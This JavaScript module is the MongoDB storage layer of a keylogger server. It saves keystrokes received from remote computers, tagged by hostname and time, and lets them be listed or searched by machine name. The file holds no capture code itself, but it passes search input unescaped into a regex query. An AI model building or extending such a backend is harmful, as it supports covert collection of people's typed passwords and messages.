/**
 * Author: Keven McDowell
 * Description: Acts as the reposity layer, which in the Model View Controller
 * idea of laying things out, is mean't to handle all database operations
 * made by the server.
 */
const mongoDB = require("mongodb").MongoClient;
let keyLoggerDB;
const keyLoggerRepo = {
  /**
   * @function connectDB
   * Function for making the connection to the database on the computer.
   */
  connectDB: () => {
    // Making the call to connect.
    mongoDB.connect("mongodb://localhost:27017/", (error, db) => {
      if (error) {
        keyLoggerDB = false;
      } else if (db) {
        // Here we assign the db instance to a global variable in the module so we can access it later.
        keyLoggerDB = db.db("admin");
      } else {
        keyLoggerDB = false;
      }
    });
  },
  /**
   * @function saveStrokes
   * @param {name}
   * Host name of the computer keystrokes are coming from.
   * @param {strokes}
   * The keystrokes received from the computer.
   * @param {time}
   * Timestamp of when the server received the keystrokes.
   */
  saveStrokes: (name, strokes, time) => {
    const newStrokes = {
      // Building an object out of the data passed.
      computerName: name,
      keystrokes: strokes,
      timestamp: time
    };
    keyLoggerDB.collection("Keystrokes").insertOne(newStrokes, (error, res) => {
      // Inserting the object into the database.
      if (error) {
        throw new Error(error);
      }
      if (!res) {
        throw new Error("No response from database");
      }
    });
  },
  /**
   * @function retrieveKeyStrokes
   * Function for grabbing all of the keystrokes from the server to be displayed on the keylogger page.
   * @returns a promise that resolves when the database call finishes with the keystrokes objects.
   */
  retrieveKeyStrokes: () => {
    return keyLoggerDB // Returning the promise that resolves when the database responds with the result.
      .collection("Keystrokes")
      .find() // Calling find with no parameters just grabs everything.
      .toArray()
      .then(items => {
        // Returns the result when the call finishes.
        return items;
      })
      .catch(e => {
        throw new Error("Error retrieving keystrokes from the DB");
      });
  },
  /**
   * @function searchKeyStrokesByName
   * Function for querying the database for keystrokes by computer name.
   * @param {name}
   * Name of the computer we want keystrokes from.
   * @returns All objects corresponding to the computer name passed.
   */
  searchKeyStrokesByName: name => {
    return keyLoggerDB
      .collection("Keystrokes")
      .find({ computerName: {"$regex": name} }) // Calling find with the search parameter.
      .toArray()
      .then(items => {
        return items;
      })
      .catch(e => {
        throw new Error(e);
      });
  }
};

module.exports = keyLoggerRepo;
